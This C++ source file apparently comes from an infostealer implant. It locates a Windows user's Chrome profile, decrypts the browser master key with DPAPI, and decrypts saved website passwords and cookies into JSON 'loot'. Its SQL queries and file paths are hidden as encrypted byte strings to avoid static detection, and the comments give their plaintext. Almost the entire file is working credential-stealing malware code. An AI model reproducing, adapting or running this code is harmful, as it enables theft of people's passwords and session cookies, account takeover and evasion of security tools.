#include <string>
#include <iostream>
#include <sstream>
#include <windows.h>
#include <dpapi.h>

#include "loot.hpp"
#include "../crypto/crypto.hpp"
#include "../file_io/file_io.h"
#include "../libs/base64/base64.h"
#include "../libs/sqlite3/sqlite3.h"
#include "../libs/sodium/sodium.h"

using namespace std;

string getEncryptedKey(string userName);
string getLoginDataPath(string userName);
string getCookiesPath(string userName);
void decryptWithAesGcm256(const unsigned char* masterKey,
	unsigned char* encrypted, int encryptedLen, unsigned char* decrypted);
void initializeSodiumLibrary();
json getPasswordRowData(sqlite3_stmt* statement, const unsigned char* masterKey);
json getCookieRowData(sqlite3_stmt* statement, const unsigned char* masterKey);

HMODULE hSqlModule = LoadLibrary(TEXT("../libs/sqlite3/sqlite3.dll"));
extern HMODULE hSodiumModule;

// Define sqlite3 functions
typedef int (*sqlite3_open_t) (const char *filename, sqlite3 **ppDb);
typedef const char* (*sqlite3_errmsg_t) (sqlite3*);
typedef int (*sqlite3_close_t) (sqlite3*);
typedef int (*sqlite3_prepare_v2_t) ( sqlite3 *db, const char *zSql, int nByte,
	sqlite3_stmt **ppStmt, const char **pzTail);
typedef int (*sqlite3_finalize_t) (sqlite3_stmt *pStmt);
typedef int (*sqlite3_step_t) (sqlite3_stmt*);
typedef const unsigned char* (*sqlite3_column_text_t) (sqlite3_stmt*, int iCol);
typedef int (*sqlite3_column_bytes_t) (sqlite3_stmt*, int iCol);

// Get addresses sqlite3 functions from sqlite3 dll
sqlite3_open_t sqlite3_open_ = (sqlite3_open_t) GetProcAddress(hSqlModule, "sqlite3_open");
sqlite3_errmsg_t sqlite3_errmsg_ = (sqlite3_errmsg_t) GetProcAddress(hSqlModule, "sqlite3_errmsg");
sqlite3_close_t sqlite3_close_ = (sqlite3_close_t) GetProcAddress(hSqlModule, "sqlite3_close");
sqlite3_prepare_v2_t sqlite3_prepare_v2_ = (sqlite3_prepare_v2_t) GetProcAddress(hSqlModule, "sqlite3_prepare_v2");
sqlite3_finalize_t sqlite3_finalize_ = (sqlite3_finalize_t) GetProcAddress(hSqlModule, "sqlite3_finalize");
sqlite3_step_t sqlite3_step_ = (sqlite3_step_t) GetProcAddress(hSqlModule, "sqlite3_step");
sqlite3_column_text_t sqlite3_column_text_ = (sqlite3_column_text_t) GetProcAddress(hSqlModule, "sqlite3_column_text");
sqlite3_column_bytes_t sqlite3_column_bytes_ = (sqlite3_column_bytes_t) GetProcAddress(hSqlModule, "sqlite3_column_bytes");

// Define crypto_aead_aes256gcm_decrypt
typedef int (*crypto_aead_aes256gcm_decrypt_t) (unsigned char *m,
	unsigned long long *mlen_p, unsigned char *nsec,
	const unsigned char *c, unsigned long long clen,
	const unsigned char *ad, unsigned long long adlen,
	const unsigned char *npub, const unsigned char *k);

// Get address of crypto_aead_aes256gcm_decrypt from sodium dll
crypto_aead_aes256gcm_decrypt_t crypto_aead_aes256gcm_decrypt_
	= (crypto_aead_aes256gcm_decrypt_t)
		GetProcAddress(hSodiumModule, "crypto_aead_aes256gcm_decrypt");

// Master key used for decrypting user passwords stored in Login Data sql file
void getMasterKey(unsigned char* masterKey, string userName) {
	string encryptedKey = getEncryptedKey(userName);

	vector<BYTE> base64Decrypted = base64_decode(encryptedKey);

	DWORD cbData = base64Decrypted.size() - 5;
	BYTE* dpapiEncrypted = new BYTE[cbData];
	copy(base64Decrypted.begin() + 5, base64Decrypted.end(), dpapiEncrypted);

	DATA_BLOB dataIn;
	DATA_BLOB dataOut;

	dataIn.pbData = dpapiEncrypted;
	dataIn.cbData = cbData;

	// DPAPI decrypt
	bool decryptSuccess =
		CryptUnprotectData(&dataIn, nullptr, nullptr, nullptr, nullptr, 0, &dataOut);

	delete[] dpapiEncrypted;

	if (!decryptSuccess) {
		cout << "Failed to decrypt" << endl;
		return;
	}

	memcpy(masterKey, dataOut.pbData, dataOut.cbData);
	LocalFree(dataOut.pbData);
}

void printUCharAsHex(unsigned char* uChar, int len) {
	// Source: https://stackoverflow.com/questions/10451493/how-to-print-unsigned-char-as-hex-in-c
	// eigenfield's answer

	for (int i = 0; i < len; i++) {
    std::cout << std::setfill('0')
      << std::setw(2)
      << std::uppercase
      << std::hex << (0xFF & uChar[i]) << " ";
	}
}

json lootChromePasswords(const unsigned char* masterKey, string userName) {

	json lootResult = json::array();

	// Initialize sodium library to use crypto_aead_aes256gcm_decrypt
	initializeSodiumLibrary();

	// Get dbFile path
	string loginDataPath = getLoginDataPath(userName);
	int pathLen = loginDataPath.length();
	char dbFile[pathLen + 1];
	strncpy(dbFile, loginDataPath.c_str(), pathLen);
	dbFile[pathLen] = '\0';

	sqlite3 *db = nullptr;
	char *zErrMsg = 0;
	int errorCode = 0;

	// Open database
	errorCode = sqlite3_open_(dbFile, &db);

	if (errorCode) {
		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg_(db));
		json error = "Error";
		return error;
	} else {
		fprintf(stderr, "Opened database successfully\n");
	}

	// Create SQL statement
	// Source: https://stackoverflow.com/questions/27383724/sqlite3-prepare-v2-sqlite3-exec
	// Rob's answer

	// Extract encrypted statementStr
	Crypto crypto = Crypto();
	int decryptedLen = 114;
	unsigned char decrypted[decryptedLen];

	unsigned char nonce[] = "\x96\x32\x4f\x3d\x74\x1f\xfd\xaa\x30\xca\xa8\xe6"
		"\x2a\xa0\x74\x8f\x41\x71\xfe\xc5\xb4\xf2\x15\x05";

 	unsigned char encryptedStatementStr[] = "\x10\xcf\x7e\x51\x57\x69\x6d\xcf\x99\x30\xa6"
		"\x92\x02\x8c\x3b\xf4\xb6\xf6\x42\xd6\x5d\x70\x5d\x5d\xe2\x30\x28\xb2\xe8\xdc"
		"\x47\x4c\x03\x06\xbe\x67\x65\x67\x04\x70\x98\x3f\x83\xa9\xc3\x03\xa2\x02\x72"
		"\x45\x93\xb5\x10\x52\x72\x13\xae\xd2\x97\xcb\x9f\x52\x97\x45\x7b\xcf\x58\x8b"
		"\xdd\x6d\xff\xc0\x4f\xac\x20\x3c\x7c\x5a\x98\x6d\x99\xdc\x6a\xca\xbb\xc9\x2c"
		"\x01\x36\x83\x1e\x8e\x12\x6d\xd6\x3c\x9a\x3f\xd7\x6e\xbc\xfe\x77\x6e\x2d\xfc"
		"\xa3\x62\x2f\x90\x56\x28\x5c\x92\xdb\x4b\xbe\xb3\x0d\xf0\x64\x14\x9e\x2a"
		"\x1b\x27\x2d\xf6\x1b";

	crypto.symmDecrypt(decrypted, nonce, encryptedStatementStr, 113 + MAC_BYTES);
	decrypted[decryptedLen - 1] = '\0';

	// "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created";
	const char* statementStr = reinterpret_cast<char*>(decrypted);
	sqlite3_stmt* statement;

	if (sqlite3_prepare_v2_(db, statementStr, -1, &statement, NULL) != SQLITE_OK) {
    cout << "Prepare failure: %s\n" << sqlite3_errmsg_(db) << endl;
		json error = "Error";
		return error;
	}

	// Get results of statement
	int stepResult;

	while ((stepResult = sqlite3_step_(statement)) == SQLITE_ROW) {
		json rowData = getPasswordRowData(statement, masterKey);
		lootResult.push_back(rowData);
	}

	if (stepResult != SQLITE_DONE) {
    cout << "Step failure: %s\n" << sqlite3_errmsg_(db) << endl;
	}

	sqlite3_finalize_(statement);
  sqlite3_close_(db);

	return lootResult;
}


json lootChromeCookies(const unsigned char* masterKey, string userName) {
	// Initialize sodium library to use crypto_aead_aes256gcm_decrypt
	initializeSodiumLibrary();
	json lootResult = json::array();

	// Get dbFile path
	string cookiesPath = getCookiesPath(userName);
	int pathLen = cookiesPath.length();
	char dbFile[pathLen + 1];
	strncpy(dbFile, cookiesPath.c_str(), pathLen);
	dbFile[pathLen] = '\0';

	sqlite3 *db = nullptr;
	char *zErrMsg = 0;
	int errorCode = 0;

	// Open database
	errorCode = sqlite3_open_(dbFile, &db);

	if (errorCode) {
		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg_(db));
		json j = "error";
		return j;
	} else {
		fprintf(stderr, "Opened database successfully\n");
	}

	// Extract encrypted statementStr
	Crypto crypto = Crypto();
	int decryptedLen = 102;
	unsigned char decrypted[decryptedLen];

	unsigned char nonce[] = "\x16\x5f\x69\x3d\x92\x43\x41\xf2\x08\xdc\x15\x79"
		"\x7a\xfe\xda\x3d\x44\x67\xc7\x67\xd8\x74\x58\x56";

 	unsigned char encryptedStatementStr[] = "\x68\x42\xe3\x14\x72\x5d\x89\xbb\x0f"
	"\x9e\x6c\xe7\x8d\xeb\x59\xf0\xe0\x6e\x49\xeb\x11\x73\xf2\xb9\xc6\x20\x16\xef"
	"\xc3\x02\x8b\xda\x78\x76\x98\xb3\x3e\x96\xd7\xfc\x42\x6d\xb2\x5c\x42\xfe\xd2"
	"\x38\x63\x81\xbd\x72\xf1\xf4\x43\xaf\x17\x4b\xb2\x9d\x24\x1d\xbc\x3f\xf5\x99"
	"\xa3\x27\x5a\x6f\xe0\x2f\xa3\x41\xcb\x14\x23\x95\x96\x56\x3e\xed\x8f\xa8\x14"
	"\x6c\x7c\x02\x4c\xb5\xe6\x7a\x6a\x83\xde\x30\xf5\xd7\x55\x41\x79\x72\x76\x82"
	"\xc8\x42\x0c\x5f\x5d\x38\xdf\x3d\xe7\x1a\x0e\xf4\xbd";

	crypto.symmDecrypt(decrypted, nonce, encryptedStatementStr, decryptedLen - 1 + MAC_BYTES);
	decrypted[decryptedLen - 1] = '\0';

	const char* statementStr = reinterpret_cast<char*>(decrypted);
	// const char* statementStr = "SELECT host_key, name, encrypted_value, path, expires_utc, source_port FROM cookies ORDER BY host_key";
	sqlite3_stmt* statement;

	if (sqlite3_prepare_v2_(db, statementStr, -1, &statement, NULL) != SQLITE_OK) {
    cout << "Prepare failure: " << sqlite3_errmsg_(db) << endl;
		json j = "error";
		return j;
	}

	int stepResult;

	while ((stepResult = sqlite3_step_(statement)) == SQLITE_ROW) {
		json rowData = getCookieRowData(statement, masterKey);
		lootResult.push_back(rowData);
	}

	if (stepResult != SQLITE_DONE) {
    cout << "Step failure: %s\n" << sqlite3_errmsg_(db) << endl;
	}

	sqlite3_finalize_(statement);
  sqlite3_close_(db);
	return lootResult;
}

// Get the encrypted key stored at Local State file
// Need to decrypt it with Base64 and then DPAPI to get the master key for decrypting user passwords
string getEncryptedKey(string userName) {
	Crypto crypto = Crypto();

	// Decrypt to get "C:\\Users\\"
	int decryptedLen1 = 10;
	unsigned char decrypted1[decryptedLen1];

	unsigned char nonce1[] = "\xd4\xb9\x5e\x15\xc0\x8d\x5c\x8d\xd9\x35\x5d\x1d"
	"\xdd\xa6\x7d\xc9\x8b\x1c\x6a\xa1\x28\xc1\xe7\x92";

 	unsigned char encryptedPath1[] = "\x75\x6b\x94\x10\xa0\xbe\x5a\x31\x32\xc8"
		"\x65\x7c\x5c\x01\x9b\x17\x04\x62\x0c\x8f\xc3\x9c\x84\x47\x27";

	crypto.symmDecrypt(decrypted1, nonce1, encryptedPath1, decryptedLen1 - 1 + MAC_BYTES);
	decrypted1[decryptedLen1 - 1] = '\0';

	// const char* sPath1 = reinterpret_cast<char*>(decrypted1);

	// Decrypt to get "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	int decryptedLen2 = 51;
	unsigned char decrypted2[decryptedLen2];

	unsigned char nonce2[] = "\x14\x8a\x1c\xe6\x6e\x08\x9d\x15\x1e\xb3\xd4\xe7"
	"\x7a\xae\x57\x09\x9a\x5c\xc7\xa9\xc8\x52\x01\x01";

 	unsigned char encryptedPath2[] = "\x7f\xc5\x64\x7a\xd2\x88\x6e\xac\x02\x8d"
	"\xc3\x1a\xc7\xdc\x1b\x82\xda\x11\x4b\x5b\xc9\x93\xfb\xee\x6a\xac\x5e\xbc"
	"\x83\x37\x76\x43\xc5\x08\x1d\x20\x68\x9d\xdb\x45\x5f\x4a\xd6\x61\x4e\xaa"
	"\xc9\x29\x89\xda\x0f\xc1\x11\xfe\x66\xbc\x71\xc9\x2f\xc0\x5e\xf6\xbb\xac"
	"\x15\xbf";

	crypto.symmDecrypt(decrypted2, nonce2, encryptedPath2, decryptedLen2 - 1 + MAC_BYTES);
	decrypted2[decryptedLen2 - 1] = '\0';

	string sPath1(reinterpret_cast<char*>(decrypted1));
	string sPath2(reinterpret_cast<char*>(decrypted2));

  ostringstream stream;
  stream << sPath1 << userName << sPath2;

	int len = stream.str().length();
	char filePath[len + 1];
  strncpy(filePath, stream.str().c_str(), len);
	filePath[len] = '\0';

	FileIO fileIO = FileIO();
	fileIO.ReadFileContent(filePath);
	char* fileContent = fileIO.fileContentBuf;

	string fileContentAsString(fileContent);
	json fileJson = json::parse(fileContentAsString);

	// Decrypt to get "os_crypt"
	int decryptedLen3 = 9;
	unsigned char decrypted3[decryptedLen3];

	unsigned char nonce3[] = "\xdb\x81\x11\x37\x83\xef\x7c\x16\xc3\x2a\x37\xed"
	"\xd5\x57\xc4\x71\xd4\xb4\x77\xad\x74\x4d\x73\xbd";

 	unsigned char encryptedIndex1[] = "\x19\xaa\xe9\xfe\x1d\x36\x57\xa6\x8c\x92"
	"\xe8\x4a\x86\xa1\x66\x38\x23\x63\x73\x57\xe5\x0d\xc7\xbf";

	crypto.symmDecrypt(decrypted3, nonce3, encryptedIndex1, decryptedLen3 - 1 + MAC_BYTES);
	decrypted3[decryptedLen3 - 1] = '\0';

	// Decrypt to get "encrypted_key"
	int decryptedLen4 = 14;
	unsigned char decrypted4[decryptedLen4];

	unsigned char nonce4[] = "\xc7\x22\x0b\xe2\x9c\x34\x27\x83\xbb\xc4\x1c\xc6"
	"\x91\x94\xf4\xfb\x2b\x08\xfc\x6b\xb9\xf7\x71\x85";

 	unsigned char encryptedIndex2[] = "\x8a\x78\x59\xb6\xd4\x6d\x3d\x2f\x49\xbe"
	"\xf6\xab\x88\xf9\x49\x6e\x8d\xb0\x00\xb6\xbc\x79\xa9\xa0\x81\x80\x16\x2c\xb6";

	crypto.symmDecrypt(decrypted4, nonce4, encryptedIndex2, decryptedLen4 - 1 + MAC_BYTES);
	decrypted4[decryptedLen4 - 1] = '\0';

	string sIndex1(reinterpret_cast<char*>(decrypted3));
	string sIndex2(reinterpret_cast<char*>(decrypted4));

	// string sIndex1 = "os_crypt";
	// string sIndex2 = "encrypted_key";
	string encryptedKey = fileJson[sIndex1][sIndex2];

	return encryptedKey;
}

// This path stores website login info (url, username, password)
string getLoginDataPath(string userName) {
	Crypto crypto = Crypto();

 	// Decrypt to get "C:\\Users\\"
	int decryptedLen1 = 10;
	unsigned char decrypted1[decryptedLen1];

	unsigned char nonce1[] = "\x38\xbe\x3e\x9b\x2e\xfe\x20\xfa\xb1\xa6\xaf\x4d"
	"\x0d\x3f\x1d\x0b\xea\xed\xed\x06\x02\x02\x22\x1b";

 	unsigned char encryptedPath1[] = "\xf4\x61\x3f\xb6\x10\x9b\x80\x95\x79\x63"
	"\x16\x27\x95\xee\x49\x74\xde\xe9\x94\x05\x8e\x20\xc3\x64\xbf";

	crypto.symmDecrypt(decrypted1, nonce1, encryptedPath1, decryptedLen1 - 1 + MAC_BYTES);
	decrypted1[decryptedLen1 - 1] = '\0';

	// Decrypt to get "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	int decryptedLen2 = 58;
	unsigned char decrypted2[decryptedLen2];

	unsigned char nonce2[] = "\x6d\x7a\x93\x98\xfe\x5f\xfc\x18\xbc\x5f\xc5\xbf"
	"\xf7\xbd\x6d\x75\xfd\xd4\x2e\x4d\x62\x9b\xeb\x4d";

 	unsigned char encryptedPath2[] = "\x81\xc5\xf2\x6c\xd7\xa3\x2e\xe6\x12\x12"
	"\xeb\xbe\x56\xbc\x49\xb7\xc4\xcf\xd1\x7b\xfc\xe5\x68\x9f\x68\xa2\x50\x32\xb7"
	"\x8e\x70\xd8\x5c\xa0\x39\xba\x0e\xa2\x94\xbe\xa5\xc6\x52\x27\xdb\xa9\x09\x3d"
	"\x36\x22\x07\x99\x0f\x14\xac\x76\xe4\x9b\x04\x3a\xf5\x79\xf0\x75\x12\x31\x03"
	"\xf5\x78\xa3\x8b\xad\x74";

	crypto.symmDecrypt(decrypted2, nonce2, encryptedPath2, decryptedLen2 - 1 + MAC_BYTES);
	decrypted2[decryptedLen2 - 1] = '\0';

	string sPath1(reinterpret_cast<char*>(decrypted1));
	string sPath2(reinterpret_cast<char*>(decrypted2));

	ostringstream stream;
  stream << sPath1 << userName << sPath2;

	string path = stream.str();
	return path;
}

string getCookiesPath(string userName) {
	Crypto crypto = Crypto();

	// Decrypt to get "C:\\Users\\"
	int decryptedLen1 = 10;
	unsigned char decrypted1[decryptedLen1];

	unsigned char nonce1[] = "\x04\xe6\x3c\x22\xf2\x3d\x42\xf3\xd8\x55\x7e\x5b"
	"\xba\xe8\x68\xff\x12\x30\xac\x4b\xcd\x96\x23\x71";

 	unsigned char encryptedPath1[] = "\x5d\x51\xe8\x16\xc6\x20\xb3\xb9\x2d\x8b"
	"\xe2\x4f\x03\x16\x20\x0d\x9a\x60\x39\x96\xf2\x08\x89\x5f\x02";

	crypto.symmDecrypt(decrypted1, nonce1, encryptedPath1, decryptedLen1 - 1 + MAC_BYTES);
	decrypted1[decryptedLen1 - 1] = '\0';

	// Decrypt to get "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
	int decryptedLen2 = 63;
	unsigned char decrypted2[decryptedLen2];

	unsigned char nonce2[] = "\x87\x51\xa9\xbd\xc3\x95\x82\xc7\x17\xed\xde\xca"
	"\x4e\x2e\xf1\x86\xa0\x51\x38\x27\xef\x91\x26\x61";

 	unsigned char encryptedPath2[] = "\xe3\x57\xc0\x06\xa2\x19\x14\xa2\x2e\x60"
	"\x69\x37\x5b\x90\x52\x34\xa0\x49\xc4\xad\x57\xbc\xe3\x78\x16\xde\xa8\x30\x13"
	"\xf5\x9e\x52\x88\x8a\x82\x73\x19\x30\x70\x8d\x26\x90\x80\x91\x0d\x3d\x46\x81"
	"\x87\x37\x93\xdf\xa9\x9b\x87\x0b\xf7\xc4\x81\x37\x9b\x71\xcd\xf7\xc3\x68\x31"
	"\x6f\x79\x4a\xa8\xe3\xf5\x16\x56\x8d\xf9\x96";

	crypto.symmDecrypt(decrypted2, nonce2, encryptedPath2, decryptedLen2 - 1 + MAC_BYTES);
	decrypted2[decryptedLen2 - 1] = '\0';

	std::string sPath1(reinterpret_cast<char*>(decrypted1));
	std::string sPath2(reinterpret_cast<char*>(decrypted2));

	std::ostringstream stream;
  stream << sPath1 << userName << sPath2;

	string path = stream.str();
	return path;
}

// Login Data contains encrypted passwords, need to decrypt using master key
void decryptWithAesGcm256(const unsigned char* masterKey,
	unsigned char* encrypted, int encryptedLen, unsigned char* decrypted) {

	// Prepare parameters for decryption function
	unsigned long long decryptedLen = 0;

	int ivLen = 12;
	BYTE iv[ivLen];
	memcpy(iv, &encrypted[3], ivLen);

	int ciphertextLen = ((int) encryptedLen) - 15;
	BYTE ciphertext[ciphertextLen];

	memset(ciphertext, 0, ciphertextLen);
	memcpy(ciphertext, &encrypted[15], ciphertextLen);

	// Reference: https://libsodium.gitbook.io/doc/secret-key_cryptography/aead/aes-256-gcm#example-combined-mode
	// Decrypt to get user's password
	bool decryptFailed = crypto_aead_aes256gcm_decrypt_(
		decrypted,
		&decryptedLen,
		NULL,
		(const unsigned char*) ciphertext,
		(unsigned long long) ciphertextLen,
		NULL,
		0,
		(const unsigned char*) iv,
		(const unsigned char*) masterKey
	);

	if (decryptFailed) {
		cout << "crypto_aead_aes256gcm_decrypt failed" << endl;
	}

	decrypted[decryptedLen] = '\0';
}

void initializeSodiumLibrary() {
	typedef int (*sodium_init_t) (void);
	typedef int (*crypto_aead_aes256gcm_is_available_t) (void);

	sodium_init_t sodium_init
		= (sodium_init_t) GetProcAddress(hSodiumModule, "sodium_init");
	crypto_aead_aes256gcm_is_available_t crypto_aead_aes256gcm_is_available
		= (crypto_aead_aes256gcm_is_available_t)
			GetProcAddress(hSodiumModule, "crypto_aead_aes256gcm_is_available");

	// Initialize sodium library, used for crypto_aead_aes256gcm_decrypt
	if (sodium_init() < 0) {
		cout << "Unable to initialize sodium, will be unable to use crypto_aead_aes256gcm_decrypt." << endl;
  }

	if (crypto_aead_aes256gcm_is_available() == 0) {
		cout << "Unable to use crypto_aead_aes256gcm on this CPU." << endl;
    abort(); /* Not available on this CPU */
	}
}

json getPasswordRowData(sqlite3_stmt* statement, const unsigned char* masterKey) {

	unsigned char* original_url = (unsigned char*) sqlite3_column_text_(statement, 0);
	unsigned char* username_value = (unsigned char*) sqlite3_column_text_(statement, 1);
	unsigned char* password_value = (unsigned char*) sqlite3_column_text_(statement, 2);
	int passwordLen = sqlite3_column_bytes_(statement, 2);

	unsigned char decryptedPassword[50];
	decryptWithAesGcm256(masterKey, password_value, passwordLen, decryptedPassword);

	string originalUrl(reinterpret_cast<char*>(original_url));
	string usernameValue(reinterpret_cast<char*>(username_value));
	string passwordValue(reinterpret_cast<char*>(decryptedPassword));

	json rowData = {
		{"original_url", originalUrl},
		{"username_value", usernameValue},
		{"password_value", passwordValue}
	};

	return rowData;
}

json getCookieRowData(sqlite3_stmt* statement, const unsigned char* masterKey) {

	unsigned char* host_key = (unsigned char*) sqlite3_column_text_(statement, 0);
	unsigned char* name = (unsigned char*) sqlite3_column_text_(statement, 1);
	unsigned char* encrypted_value = (unsigned char*) sqlite3_column_text_(statement, 2);
	unsigned char* path = (unsigned char*) sqlite3_column_text_(statement, 3);
	unsigned char* expires_utc = (unsigned char*) sqlite3_column_text_(statement, 4);
	unsigned char* source_port = (unsigned char*) sqlite3_column_text_(statement, 5);
	int encrypted_value_len = sqlite3_column_bytes_(statement, 2);

	unsigned char decryptedValue[1000];
	decryptWithAesGcm256(masterKey, encrypted_value, encrypted_value_len, decryptedValue);

	// Convert to strings so that they could be added to a json structure
	string host_key_s(reinterpret_cast<char*>(host_key));
	string name_s(reinterpret_cast<char*>(name));
	string decrypted_value_s(reinterpret_cast<char*>(decryptedValue));
	string path_s(reinterpret_cast<char*>(path));
	string expires_utc_s(reinterpret_cast<char*>(expires_utc));
	string source_port_s(reinterpret_cast<char*>(source_port));

	json rowData = {
		{"host_key", host_key_s},
		{"name", name_s},
		{"decrypted_value", decrypted_value_s},
		{"path", path_s},
		{"expires_utc", expires_utc_s},
		{"source_port", source_port_s}
	};

	return rowData;
}
